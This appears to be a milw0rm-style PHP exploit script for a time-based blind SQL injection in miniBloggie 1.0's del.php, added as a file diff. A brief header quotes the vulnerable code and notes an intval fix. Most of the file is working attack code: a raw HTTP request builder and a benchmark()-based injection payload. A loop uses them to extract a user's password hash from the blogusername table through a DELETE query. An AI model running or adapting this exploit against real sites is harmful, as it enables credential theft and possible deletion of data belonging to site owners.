@@ -1,0 +1,125 @@
+#!/usr/bin/php 
+<?php
+
+error_reporting(0);
+
+
+/*
+   miniBloggie 1.0 (del.php) Remote Blind SQL Injection Exploit
+   ------------------------------------------------------------
+   Author -> StAkeR aka athos - StAkeR[at]hotmail[dot]it
+   Date   -> 18/10/2008
+   Get    -> http://www.mywebland.com/dl.php?id=2
+   ------------------------------------------------------------
+   
+   File del.php
+   
+   25. if (isset($_GET['post_id'])) $post_id = $_GET['post_id'];
+   26. if (isset($_GET['confirm'])) $confirm = $_GET['confirm'];
+   27.
+   28. if ($confirm=="") {   
+   29. notice("Confirmation", "Warning : Do you want to delete this post ? <a href=del.php?post_id=".$post_id."&confirm=yes>Yes</a>");
+   30. }
+   31. elseif ($confirm=="yes") {
+   32. // Data Base Connection  //
+   33. dbConnect();
+   34. $sql = "DELETE FROM blogdata WHERE post_id=$post_id";
+   35. $query = mysql_query($sql) or die("Cannot query the database.<br>" . mysql_error());
+   36. $confirm ="";
+   37. notice("Del Post", "Data Deleted");
+   38. }
+   39. else notice( "Delete Error, Unable to complete the task !" );
+   40. ?>
+
+   NOTE:
+   
+   $sql = "DELETE FROM blogdata WHERE post_id=$post_id";
+   
+   $post_id isn't escaped so you can execute SQL Code 
+   
+   How to fix? sanize $post_id with intval or int (PHP Functions)
+   
+  
+*/  
+
+
+
+function get($host,$path,$evil)
+{
+  if(!preg_match('/\w:[0-9]/i',$host)) alert();
+  $inet = explode(':',$host);
+
+  if(!$sock = fsockopen($inet[0],$inet[1])) die('connection refused');
+  
+  $data .= "GET /$path/del.php?post_id={$evil}&confirm=yes HTTP/1.1\r\n";
+  $data .= "Host: $host[0]\r\n";
+  $data .= "User-Agent: Lynx (textmode)\r\n";
+  $data .= "Connection: close\r\n\r\n";
+  
+  fputs($sock,$data);
+  
+  while(!feof($sock)) { $html .= fgets($sock); }
+  fclose($sock);
+  
+  return $html;
+}
+
+
+function alert()
+{
+  echo "# miniBloggie 1.0 (del.php) Remote Blind SQL Injection Exploit\r\n";
+  echo "# Usage: php {$argv[0]} [host:port] [path] [user_id]\r\n";
+  echo "# Usage: php {$argv[0]} localhost:80 /minibloggie 1\r\n";
+  die;
+}
+
+
+function charme($char,$colum,$id)
+{
+  $sql = "1 or (select if((ascii(substring(password".
+         ",$colum,1))=$char),benchmark(200000000,char(0)),0)".
+         " from blogusername where id=$id)#";
+  
+  return urlencode($sql);
+}
+
+
+$hash = array(0,48,49,50,51,52,53,54,55,56,57,97,98,99,100,101,102);
+$c = 0;
+
+
+for($i=0;$i<=32;$i++)
+{
+  for($j=0;$j<=17;$j++)
+  {
+    $start = time();
+    
+    get($argv[1],$argv[2],charme($hash[$j],$c,intval($argv[3])));
+    
+    $stop = time();
+    
+    if($stop - $start > 12)
+    {
+      $password .= chr($hash[$j]);
+      $c++;;
+      break;
+    }
+  }
+}
+
+if(isset($password))
+{
+  echo "# Hash: $password\r\n";
+  die;
+}
+else
+{
+  echo "# Exploit Failed!\r\n";
+}
+    
+
+
+
+?>
+
+# milw0rm.com [2008-10-18]
